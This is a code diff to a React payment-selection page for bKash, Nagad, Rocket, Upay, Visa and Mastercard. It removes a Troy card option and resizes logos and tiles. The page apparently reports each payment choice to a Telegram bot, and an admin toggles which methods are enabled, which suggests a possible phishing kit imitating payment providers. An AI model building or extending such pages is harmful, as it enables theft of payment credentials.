@@ -46,7 +46,7 @@ const Index = () => {
   
   const [loginUnlocked, setLoginUnlocked] = useState(false);
   const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>({
-    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, troy: true,
+    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true,
   });
 
   const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;
@@ -121,7 +121,7 @@ const Index = () => {
 
   const handlePaymentSelect = (route: string) => {
     const methodName = route.replace('/', '');
-    const isCard = ['visa', 'mastercard', 'troy'].includes(methodName);
+    const isCard = ['visa', 'mastercard'].includes(methodName);
     sendTelegramNotification({
       type: 'payment_activity',
       method: methodName,
@@ -266,7 +266,7 @@ const Index = () => {
               <img 
                 src={genzLogo} 
                 alt="GenZ" 
-                className="w-14 h-14 rounded-full object-cover"
+                className="w-14 h-14 md:w-20 md:h-20 rounded-full object-cover"
               />
             </div>
 
@@ -339,20 +339,19 @@ const Index = () => {
               )}
               <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
                 {[
-                  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-10 md:h-12' },
-                  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-10 md:h-12' },
-                  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-10 md:h-12' },
-                  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-10 md:h-12' },
-                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'VISA', h: 'h-9 md:h-11' },
-                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-10 md:h-12' },
-                  { id: 'troy', route: '/visa', logo: troyLogo, alt: 'Troy', h: 'h-9 md:h-11' },
+                  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-14 md:h-16' },
+                  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-14 md:h-16' },
+                  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-14 md:h-16' },
+                  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-14 md:h-16' },
+                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'VISA', h: 'h-12 md:h-14' },
+                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-16' },
                 ].map((method) => {
                   const isEnabled = enabledMethods[method.id] ?? false;
                   return (
                     <div
                       key={method.id}
                       onClick={() => !isAdmin && isEnabled && handlePaymentSelect(method.route)}
-                      className={`relative group bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[80px] md:h-24 overflow-hidden transition-all ${isEnabled && !isAdmin ? 'cursor-pointer' : ''} ${!isEnabled ? 'cursor-not-allowed' : ''}`}
+                      className={`relative group bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[64px] md:h-[72px] overflow-hidden transition-all ${isEnabled && !isAdmin ? 'cursor-pointer' : ''} ${!isEnabled ? 'cursor-not-allowed' : ''}`}
                     >
                       <img src={method.logo} alt={method.alt} className={`${method.h} object-contain transition-transform duration-300 ${isEnabled ? '' : 'opacity-50'} ${isEnabled && !isAdmin ? `lg:group-hover:scale-90 ${clickedCard === method.route ? 'scale-90' : ''}` : ''}`} />
                       {!isEnabled && !isAdmin && (
